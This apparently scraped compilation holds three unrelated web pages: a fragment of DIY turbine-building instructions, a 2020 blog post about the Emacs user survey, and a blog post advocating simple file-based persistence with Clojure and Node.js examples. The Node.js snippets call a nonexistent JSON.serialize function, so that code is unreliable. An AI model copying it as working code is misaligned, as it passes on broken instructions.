  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>

October 22, 2020 | https://emacsredux.com/blog/2020/10/22/state-of-emacs-survey/ | <a href="https://web.archive.org/web/*/https://emacsredux.com/blog/2020/10/22/state-of-emacs-survey/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>Recently I learned of the first-ever <a href="https://emacssurvey.org/">State of Emacs survey</a>
and I wanted to share a few thought about it with my readers. Okay, the survey is officially
named just “Emacs Survey”, but it clearly draws a lot of inspiration from the numerous
“State of Technology X” surveys that have become popular in recent years. That’s why
I took the liberty to re-frame it in a way that will probably be familiar to more people.</p>

<p>The “State of Something” surveys are typically ran by the teams
maintaining some project to assess the health of its ecosystem, the
needs of their users, the problems that need to be solved, the tools
that people are using and so on. A good example would be the <a href="https://clojure.org/news/2020/02/20/state-of-clojure-2020">State of
Clojure</a>,
that I participate in every year. There are similar surveys for many
programming languages and even for some tools - e.g. I ran in the past
a <a href="https://metaredux.com/posts/2019/11/02/state-of-cider.html">State of
CIDER</a>
survey.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> Ideally, the data collected from the surveys drives the
future development to some extent, and results in a better experience
for everyone involved. I can speak from experience that the “State of Clojure” and
“State of CIDER” surveys definitely influenced the direction of the projects.</p>

<p>The “State of Emacs” survey is a somewhat different, though.  One
thing that bothers me a bit about the Emacs survey is that its site
doesn’t list any clear purpose/goals for the survey. That definitely
seems pretty weird to me. I saw the survey discussed on the Emacs
mailing list and on
<a href="https://www.reddit.com/r/emacs/comments/je3eht/emacs_user_survey_2020_is_open/">Reddit</a>,
but sticking a paragraph of rationale on the survey site would have
certainly helped. The survey is also not official in the sense, that
it’s not initiated by Emacs’s development team, and judging by the
hostility the topic generated on the <code>emacs-devel</code> mailing list it’s
not like they were particularly excited about it.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> It was funny
that most of the comments were complaints about things like the use of
non-free JavaScript in the survey form and topics like that, instead
of some constructive conversation about the format of the survey. I
was especially upset about the hostility towards the amazing MELPA
project on the mailing list (in his typical style RMS even wanted
MELPA to be denounced in the survey, as he considers it evil). Implying that it’d be
easy to replace MELPA with some core Emacs repository is like a bad
joke, given how the deficiencies of GNU ELPA were the reason for the
rise of MELPA in the first place. Anyways, I’m digressing.</p>

<p>Despite of all my concerns, I hope that the survey be a success in the
sense that it will collect enough useful data points to influence the
future development roadmap of Emacs and align better the vision of
Emacs’s maintainers with the needs and the usage patterns of their
users.  I’ve already filled out the survey myself and I liked the
questions in it, although, I would have definitely structured it
somewhat differently. I see some constant trend to compare stuff in
Emacs with external packages (e.g. Magit vs <code>vc</code>, Flycheck vs Flymake,
Projectile vs <code>project.el</code>), which I find slightly bizarre given the
trend in Emacs to move as many built-in packages as possible to GNU
ELPA, and the fact that Emacs has always been about diversity of
solutions, picking whatever works best for you and so
on. Standardization efforts seems somewhat against the spirit of
Emacs, but that’s just my very personal take.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>In case someone is curious about my Emacs wish list - I don’t really
care about changing any defaults, package improvements or anything
like this.  I’d like to see more efforts for improving Emacs Lisp, the
standard library (libraries like <code>seq.el</code> and <code>map.el</code> were great additions IMO),
making it possible to build rich UIs in some sane manner (overlays are
quite limiting). I’d also love to see the bar to contributing to be lowered:</p>

<ul>
  <li>drop the contributor agreement</li>
  <li>discuss ideas in an (modern) issue tracker, instead of on a mailing list</li>
  <li>apply less political activism and more pragmatism in the conversation around new ideas/features<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ul>

<p>I doubt anything like this is going to happen any time soon, but one can dream, right?</p>

<p>Finally, I’m obviously curious how my own Emacs
Prelude and my packages like Projectile, crux and so on will fare in
the survey. Are Zenburn and Solarized still the most popular color themes out there?
You tell me! :-)</p>

<p>Big thanks to <a href="https://blog.abrochard.com/">Adrien Brochard</a> for undertaking this daunting
task and creating the “State of Emacs” survey!
It will be open until the end
of November. You can fill out the survey form directly

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Does nobody teach fopen anymore?</h2>

<p>Many programmers start with “Hello World”. Shortly after that, it’s “Hello
$NAME”, with a string read off stdin. But soon, budding engineers get tired of
reminding their computer of their name each and every time their code runs.
When I was first learning to program, file IO was an early requirement. We were
taught how to read and write “data files” using little more than fopen,
fscanf, fprintf, and fclose.</p>

<p>Fast forward five to ten years; you find yourself writing your 10 millionth SQL
query, wishing for simpler times. Spend some more time with the NoSQL database
du jour and the humble fopen function will be but a distant memory.  Until that
one fateful day arrives where you’ve got a relatively simple program and
encounter the need for equally simple durability. Five years ago, you’d have
cracked your knuckles and hacked out a pair of “save” and “load” functions.
Today, you add a dependency on your favorite database driver, switch to the
shell, type <code>createdb myapp</code> and then dutifully begin defining a lovely schema.
Of course, now you need to either rework your models to conform to some horrid
ORM layer, or write save/load-style “hydrate” and “dehydrate” methods anyway.</p>

<p>Now, at ten years and a day, you decide it’s finally time to learn that hip new
programming language that everybody is talking about. You’ve got your book out,
you’ve rocked through all your favorite technical interview puzzles, and you’re
ready to put together a little web service for personal or small group use.  If
this was yesterday, you’d know exactly what dependency to add and how to
proceed, but that was yesterday. Today, you do some Googling or hop into IRC
looking to find out what’s popular.</p>

<p>Why don’t you even consider fopen?</p>

<h2>But files aren’t “Web Scale”!</h2>

<p>Is that really true? And do you really care? Should you really care?</p>

<p>The answer to all of these questions is “No”. Files can easily be “web scale”.
As of 2013, Hacker News is still running as a single process, on a single core,
of a single server, backed by a directory structure of simple data files.
Nearly 2 million page views are served daily. See <a href="https://news.ycombinator.com/item?id=5229522">this thread</a> and
<a href="https://news.ycombinator.com/item?id=5253773">this submission</a> for details.</p>

<p>The bottom line on this subject is that 1) You’re going to need significant
cleverness to scale any service regardless of whether you use a database or the
file system directly. And 2) You probably won’t need to scale hugely anytime
soon, anyway. Being crushed by traffic is a Good Problem To Have, so let’s
worry about the Ghost Town problem first. 3) You can always refactor later.</p>

<h2>Data Literals: print, read, spit, and slurp</h2>

<p>This article was prompted by a reoccurring discussion started by newcomers to
the Clojure IRC channel. Having learned the basics, folks want to hit the
ground running with stateful and durable services. Coming from a background in
some big framework or some hairy application, these folks ask those suggestive
questions about databases, driver libraries, and the like. Often, upon
interrogation, they only have a couple kilobytes or megabytes of total data to
be stored. In such a situation, the advice is always the same: Put that data
into an atom, then use <code>spit</code> and <code>slurp</code> to save and load.</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>(</span><span>def </span><span>db</span> <span>(</span><span>atom</span> <span>{</span><span>...</span><span>}))</span>
</span><span>
</span><span><span>(</span><span>defn </span><span>save-data</span> <span>[]</span>
</span><span>  <span>(</span><span>spit</span> <span>"somefile"</span> <span>(</span><span>prn-str </span><span>@</span><span>db</span><span>)))</span>
</span><span>
</span><span><span>(</span><span>defn </span><span>load-data</span> <span>[]</span>
</span><span>  <span>(</span><span>reset!</span> <span>db</span> <span>(</span><span>read-string</span> <span>(</span><span>slurp </span><span>"somefile"</span><span>))))</span>
</span></code></pre></div></div></figure>


<p>Because Clojure encourages the use of printable, readable, “pure” data, your
save and load functions are virtually free! If you’re not familiar with
Clojure, then consider working with pure JSON in Node.js:</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>var</span> <span>db</span> <span>=</span> <span>{...};</span>
</span><span>
</span><span><span>function</span> <span>saveData</span><span>()</span> <span>{</span>
</span><span>  <span>fs</span><span>.</span><span>writeFileSync</span><span>(</span><span>"somefile"</span><span>,</span> <span>JSON</span><span>.</span><span>serialize</span><span>(</span><span>db</span><span>));</span>
</span><span><span>}</span>
</span><span>
</span><span><span>function</span> <span>loadData</span><span>()</span> <span>{</span>
</span><span>  <span>db</span> <span>=</span> <span>JSON</span><span>.</span><span>parse</span><span>(</span><span>fs</span><span>.</span><span>readFileSync</span><span>(</span><span>"somefile"</span><span>));</span>
</span><span><span>}</span>
</span></code></pre></div></div></figure>


<p>Things aren’t quite as easy in languages lacking data literals, but nearly
every popular language has some kind of automatic serialization library.
However, even if you do need to write your own save and load functions, it’s
a pretty straightforward, if somewhat tedious, process.</p>

<p>Even—or especially—experienced programmers are surprised by just how far
this brain-dead-simple durability scheme will go.</p>

<h2>Atomicity</h2>

<p>One other objection to files is that it’s difficult to ensure an application
enjoys the same guarantees that a well-tested ACID database affords. Never mind
the fact that the majority of Rails applications suffer from dozens of
consistency bugs because most developers forget to wrap related updates in
transactions; it is true that incorrectly implemented file IO can cause
catastrophic data loss.</p>

<p>If you plan to deploy spit and slurp into production, you’d be advised to write
to a temporary file and utilize an atomic rename. This ensures that a failure
during writing won’t corrupt your database. See <code>man rename</code> for more.</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>function</span> <span>saveData</span><span>()</span> <span>{</span>
</span><span>  <span>fs</span><span>.</span><span>writeFileSync</span><span>(</span><span>"somefile.tmp"</span><span>,</span> <span>JSON</span><span>.</span><span>serialize</span><span>(</span><span>db</span><span>));</span>
</span><span>  <span>fs</span><span>.</span><span>renameSync</span><span>(</span><span>"somefile.tmp"</span><span>,</span> <span>"somefile"</span><span>);</span>
</span><span><span>}</span>
</span></code></pre></div></div></figure>


<p>Just this one little tweak and this bad boy is production ready. Clojure
programmers can use Java’s <code>File.renameTo</code> method. See below.</p>

<p>Remember to configure your backups!</p>

<h2>Don’t Stop The World</h2>

<p>Experienced Node.js programmers likely cringed at the “Sync” suffix on the
above file operations. These operations will block while data is being read or
written. In addition to yielding clearer example code, synchronous operations
do not require coordination. If your application only needs to serve a handful
of users, you can still write 100 megabytes of data in less than half a
second. Even if you write every change to a file on every request, your ten
users might not even notice your blocking IO. As you scale up, you’ll need to
either split your data files up and/or start writing files asynchronously.</p>

<p>Asynchronous means coordination. Coordination means locking or queues. This
stuff really isn’t as scary as it sounds, but it will have to wait; this post
has already gotten far too long. However, I don’t want to lead you down the
wrong path, so I should mention that, unlike Node.js, synchronous writes on
the JVM will not block other requests. You practically don’t have a choice, but
to be asynchronous.  If two requests both call your save function at the same
time, the resulting race condition can lead to incremental data loss. Luckily,
Clojure’s agents and persistent data structures provide for a super quick fix:</p>

<figure><figcaption><span></span></figcaption><div><div><pre><code><span><span>(</span><span>import </span><span>'java.io.File</span><span>)</span>
</span><span>
</span><span><span>(</span><span>def </span><span>save-agent</span> <span>(</span><span>agent </span><span>nil</span><span>))</span>
</span><span>
</span><span><span>(</span><span>defn </span><span>save-data</span> <span>[]</span>
</span><span>  <span>(</span><span>send-off </span><span>save-agent</span>
</span><span>    <span>(</span><span>fn </span><span>[</span><span>_</span><span>]</span>
</span><span>      <span>(</span><span>spit</span> <span>"somefile.tmp"</span> <span>(</span><span>prn-str </span><span>@</span><span>db</span><span>))</span>
</span><span>      <span>(</span><span>.renameTo</span> <span>(</span><span>File.</span> <span>"somefile.tmp"</span><span>)</span> <span>(</span><span>File.</span> <span>"somefile"</span><span>)))))</span>
</span></code></pre></div></div></figure>


<p>Different web servers across all the different languages have varying
concurrency support and configuration defaults. Whether or not you use file IO,
you should be aware of the concurrency story for your platform and its impact
on your application.</p>
